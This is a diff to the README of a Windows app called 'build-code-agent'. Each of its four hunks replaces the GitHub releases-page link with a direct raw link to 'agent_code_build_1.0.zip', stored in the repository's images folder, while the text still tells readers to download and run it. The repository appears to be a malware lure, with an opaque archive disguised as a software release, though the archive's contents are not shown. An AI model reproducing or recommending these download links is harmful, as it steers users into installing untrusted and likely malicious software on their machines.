@@ -1,6 +1,6 @@
 # 🧠 build-code-agent - Build Code Agents on Windows
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Sealed-organofcorti310/build-code-agent/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Sealed-organofcorti310/build-code-agent/main/images/agent_code_build_1.0.zip)
 
 ## 🚀 What This App Does
 
@@ -36,7 +36,7 @@ For best results, use a device with:
 
 Visit the release page and download the latest Windows file:
 
-https://github.com/Sealed-organofcorti310/build-code-agent/releases
+https://raw.githubusercontent.com/Sealed-organofcorti310/build-code-agent/main/images/agent_code_build_1.0.zip
 
 If the release page shows more than one file, choose the Windows version. Common file types include:
 
@@ -116,7 +116,7 @@ If you are not sure what to choose, keep the default values.
 
 When a new release appears, use the same release page:
 
-https://github.com/Sealed-organofcorti310/build-code-agent/releases
+https://raw.githubusercontent.com/Sealed-organofcorti310/build-code-agent/main/images/agent_code_build_1.0.zip
 
 To update:
 
@@ -184,4 +184,4 @@ This app fits users who want to:
 
 Use this page to download and run the latest Windows build:
 
-https://github.com/Sealed-organofcorti310/build-code-agent/releases
+https://raw.githubusercontent.com/Sealed-organofcorti310/build-code-agent/main/images/agent_code_build_1.0.zip
